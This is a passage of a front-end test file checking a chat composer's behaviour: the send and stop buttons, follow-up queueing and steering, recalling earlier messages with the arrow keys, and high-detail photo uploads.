  expect(box().value).toBe("");
  expect(screen.queryByRole("button", { name: "Take back: racing" })).toBeNull();
});

test("while a turn runs: send follows the follow-up setting, the other button and Ctrl+Enter send the other way; stop stays beside send, and with nothing to send, send is stop", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  play(state({ followUp: "queue", phase: "running" }));
  expect(screen.queryByRole("button", { name: "Send" })).toBeNull();
  expect(screen.getByRole("button", { name: "Stop" })).toBeTruthy();
  expect(box().getAttribute("placeholder")).toBe("Queue a follow-up");
  type("queued one");
  expect(screen.getByRole("button", { name: "Stop" })).toBeTruthy(); // stopping doesn't need the draft cleared
  // beside send's filled ink circle and arrow, stop is a filled square on a soft circle, so the two
  // never look alike
  expect(screen.getByRole("button", { name: "Stop" }).querySelector(".lucide-square")).not.toBeNull();
  expect(screen.getByRole("button", { name: "Stop" }).className).toContain("bg-soft");
  expect(screen.getByRole("button", { name: "Send" }).querySelector(".lucide-arrow-up")).not.toBeNull();
  expect(screen.getByRole("button", { name: "Send" }).className).toContain("bg-primary");
  fireEvent.click(screen.getByRole("button", { name: "Send" }));
  type("right now");
  fireEvent.click(screen.getByRole("button", { name: "Send now" }));
  type("also now");
  fireEvent.keyDown(box(), { ctrlKey: true, key: "Enter" });
  expect(frames(server.sent).map((f) => [f.messages?.at(-1)?.content, f.forwardedProps?.followUp])).toEqual([
    ["queued one", undefined],
    ["right now", "steer"],
    ["also now", "steer"],
  ]);
  // steering, the other button queues
  play(state({ followUp: "steer" }));
  type("later");
  fireEvent.click(screen.getByRole("button", { name: "Queue for the next turn" }));
  expect(frames(server.sent).at(-1)?.forwardedProps?.followUp).toBe("queue");
});

test("the follow-up setting is the server's: the composer sends the change, and shows what the state says", async () => {
  const { server } = start();
  await screen.findByText("what is in the repo?");
  fireEvent.click(screen.getByRole("button", { name: "Follow-ups: steer" }));
  fireEvent.click(await screen.findByRole("button", { name: /^Queue/ }));
  expect(frames(server.sent).at(-1)).toMatchObject({ followUp: "queue", type: "settings" });
});

test("on a keyboard, Up in an empty composer recalls this client's sent messages, Down goes back; edited, it stays", async () => {
  start();
  await screen.findByText("what is in the repo?");
  for (const t of ["first", "second"]) {
    type(t);
    fireEvent.keyDown(box(), { key: "Enter" });
  }
  fireEvent.keyDown(box(), { key: "ArrowUp" });
  expect(box().value).toBe("second");
  box().setSelectionRange(0, 0);
  fireEvent.keyDown(box(), { key: "ArrowUp" });
  expect(box().value).toBe("first");
  box().setSelectionRange(5, 5);
  fireEvent.keyDown(box(), { key: "ArrowDown" });
  expect(box().value).toBe("second");
  box().setSelectionRange(6, 6);
  fireEvent.keyDown(box(), { key: "ArrowDown" });
  expect(box().value).toBe("");
  type("my own");
  fireEvent.keyDown(box(), { key: "ArrowUp" });
  expect(box().value).toBe("my own");
  expect(screen.getByTestId("composer-hint").textContent).toContain("↑ last message");
});

test("a photo can go up at high detail: it is uploaded again with ?detail=high, and send waits for it, saying why", async () => {
  const uploads = fakeUploads();
  start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(png("board.png")) });
  fireEvent.change(picker);
  await waitFor(() => {
    expect(uploads.started).toHaveLength(1);
  });
  expect(screen.getByTestId("composer-hint").textContent).toBe("waiting for 1 upload…");
  expect(screen.getByRole("button", { name: "Send" }).hasAttribute("disabled")).toBe(true);
  await act(async () => {
    uploads.started[0]?.finish(SHA("a"));
  });
  const hd = screen.getByRole("button", { name: "High detail for board.png" });
  expect(hd.getAttribute("aria-pressed")).toBe("false");
  fireEvent.click(hd);
  await waitFor(() => {
    expect(uploads.started.map((u) => u.detail)).toEqual(["standard", "high"]);
  });
  expect(screen.getByRole("button", { name: "High detail for board.png" }).getAttribute("aria-pressed")).toBe("true");
  expect(screen.getByRole("button", { name: "Send" }).hasAttribute("disabled")).toBe(true);
  await act(async () => {
    uploads.started[1]?.finish(SHA("e"));
  });
  expect(screen.getByRole("button", { name: "Send" }).hasAttribute("disabled")).toBe(false);
});
